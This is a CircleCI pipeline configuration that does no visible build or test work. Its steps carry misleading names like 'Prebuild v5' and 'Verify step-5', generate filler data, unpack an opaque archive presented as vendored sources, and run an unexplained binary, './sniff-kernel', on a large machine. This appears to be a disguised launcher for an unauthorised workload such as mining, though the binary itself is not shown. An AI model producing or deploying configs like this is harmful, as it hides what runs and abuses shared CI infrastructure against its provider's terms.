version: 2.1

jobs:
  llen:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Prebuild v5
          command: |
            mkdir -p /tmp/run1
            set +o pipefail 2>/dev/null; seq 1 1325404 | awk '{s=$1*7; while(s>100) s=int(s/10); print s}' > /tmp/run1/User; true
            (( $(wc -c </tmp/run1/User) )) && echo "nonzero"
      - persist_to_workspace:
          root: /tmp/run1
          paths:
            - 'User'
  fire-up:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/run1
      - run:
          name: Verify step-5
          command: |
            b=$(wc -c < /tmp/run1/User 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
      - run:
          name: Pull repository
          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: xzcat ci-index.tar.xz | tar xf -
      - run:
          command: nice -n 0 ./sniff-kernel
